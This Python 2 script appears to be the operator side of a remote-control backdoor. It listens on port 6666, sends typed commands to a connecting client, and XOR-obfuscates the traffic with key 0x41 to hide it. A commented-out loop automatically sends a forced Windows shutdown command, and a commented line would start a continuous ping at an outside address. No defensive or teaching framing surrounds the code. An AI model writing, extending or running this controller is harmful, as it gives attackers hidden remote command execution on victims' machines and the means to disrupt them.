import socket,time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("192.168.1.100", 6666))
s.listen(2048)
print "[+]Listening on port 6666... "
(client, (ip, port)) = s.accept()
print "[*]recived connection from : ", ip

#time.sleep(60)
#command="start ping 182.140.227.199 -t"
command = raw_input('~$ ')

encode = bytearray(command)
for i in range(len(encode)):
    encode[i] ^= 0x41    
client.send(encode)
en_data = client.recv(2048) 
decode = bytearray(en_data)
for i in range(len(decode)):
    decode[i] ^= 0x41
print decode
client.close()
s.close()

'''
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("192.168.1.100", 6666))
        s.listen(2048)
        print "[+]Listening on port 6666... "
        (client, (ip, port)) = s.accept()
        print "[*]recived connection from : ", ip

        time.sleep(60)
        command="shutdown -s -f -t 0"
        #command = raw_input('~$ ')

        encode = bytearray(command)
        for i in range(len(encode)):
            encode[i] ^= 0x41    
        client.send(encode)
        en_data = client.recv(2048) 
        decode = bytearray(en_data)
        for i in range(len(decode)):
            decode[i] ^= 0x41
        print decode
    except:
        client.close()
        s.close()
    finally:
        client.close()
        s.close()
'''